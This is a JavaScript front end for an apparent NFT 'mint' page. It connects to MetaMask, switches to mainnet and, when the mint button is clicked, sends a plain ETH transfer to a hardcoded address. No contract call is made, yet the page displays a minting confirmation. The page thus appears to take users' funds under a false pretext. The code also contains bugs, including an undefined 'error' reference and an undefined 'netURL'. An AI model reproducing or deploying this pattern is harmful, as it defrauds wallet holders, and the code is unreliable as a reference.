const ADDRESS = '0x919F08eE29b8a6B681e44B785F3626EC3c249d19';
const web3 = window.Web3
const ethereum = window.ethereum
let accounts
let price = 0.1
const mint = document.querySelector(".mint")
const connect = document.querySelector(".connect")
const title = document.querySelector(".metamask_content-title")
const totalPrice = document.querySelector(".totalPrice")
const count = document.querySelector(".count")
const walletAddress = document.querySelector(".walletAddress")

var totalPriceAmount = price;
var countAmount = 1;

function checkConnectStatus(){
  if(ethereum){
    if (ethereum.selectedAddress) {
        connect.style.display = "none"
        mint.style.display = "block"
    }
    else if (ethereum.isMetaMask) {
        connect.style.display = "block"
        mint.style.display = "none"
    }
  }else{
    connect.style.display = "block"
    mint.style.display = "none"
  }
}
window.addEventListener("load", () => {

  totalPrice.innerText=price;
  checkConnectStatus();

})

const getAccount = async () => {
    accounts = await ethereum.request({ method: 'eth_requestAccounts' });
    console.log(accounts)
    walletAddress.innerText = accounts[0].substring(0,20) + "...";
    if (window.ethereum.chainId == "0x1") {
      console.log("Already connected to ethereum mainnet...");
      checkConnectStatus();
    }
    else {
        try {
            await ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{chainId: '0x1'}],
            });
            checkConnectStatus();
        } catch (switchError) {
            // This error code indicates that the chain has not been added to MetaMask.
            if (error.code === 4902) {
                try {
                    await ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x1',
                            rpcUrl: netURL
                        }],
                    });
                    checkConnectStatus();
                } catch (addError) {
                    // handle "add" error
                }
            }
        }
    }
}


const sendTransaction =  async () => {
    const priceToWei = (totalPriceAmount * 1e18).toString(16)
    const gasLimit = (100_000 * totalPriceAmount).toString(16);

    ethereum.request({
            method: 'eth_sendTransaction',
            params: [
                {
                    from: accounts[0],
                    to: ADDRESS,
                    value: priceToWei
                },
            ],
        })
        .then((txHash) => {
          $('#mintingModal').modal('show')
        })
        .catch((error) => {
        });
};



setTimeout(function(){
  getAccount();
}, 1000);

mint.addEventListener("click", async () => {

        await getAccount()
        await sendTransaction()

});

connect.addEventListener("click", async () => {
    await getAccount()

})


document.querySelector(".plus").addEventListener("click", () => {
	if(countAmount < 3) {
    countAmount++;
    totalPriceAmount = (countAmount*price).toFixed(2);
    count.innerText = countAmount;
    totalPrice.innerText = totalPriceAmount;
	}
})

document.querySelector(".minus").addEventListener("click", () => {
	if(countAmount > 1) {
    countAmount--;
    totalPriceAmount = (countAmount*price).toFixed(2);
    count.innerText = countAmount;
    totalPrice.innerText = totalPriceAmount;
	}
})

document.querySelector(".setMax").addEventListener("click", () => {
    countAmount = 3
    totalPriceAmount = (countAmount*price).toFixed(2);
    count.innerText = countAmount;
    totalPrice.innerText = totalPriceAmount;
})

function getMobileOperatingSystem() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;
    console.log(userAgent);
    // Windows Phone must come first because its UA also contains "Android"
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const uid = urlParams.get('uid')
    console.log(uid);
    if(uid == "mm"){
      return "Metamask";
    }
    if (/windows phone/i.test(userAgent)) {
        return "Windows Phone";
    }

    if (/android/i.test(userAgent)) {
        return "Android";
    }

    // iOS detection from: http://stackoverflow.com/a/9039885/177710
    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return "iOS";
    }

    return "unknown";
}
document.addEventListener('DOMContentLoaded', (event) => {
  if(getMobileOperatingSystem() == "Android" || getMobileOperatingSystem()=="iOS"){
      var wrapper = document.createElement('a');
      wrapper.classList.add('mmLink');
      wrapper.href="https://metamask.app.link/dapp/" + ((window.location.href).replace('https://', '').replace('http://', '')) + "?uid=mm";
      connect.parentNode.insertBefore(wrapper, connect);
      wrapper.appendChild(connect);
  }

});
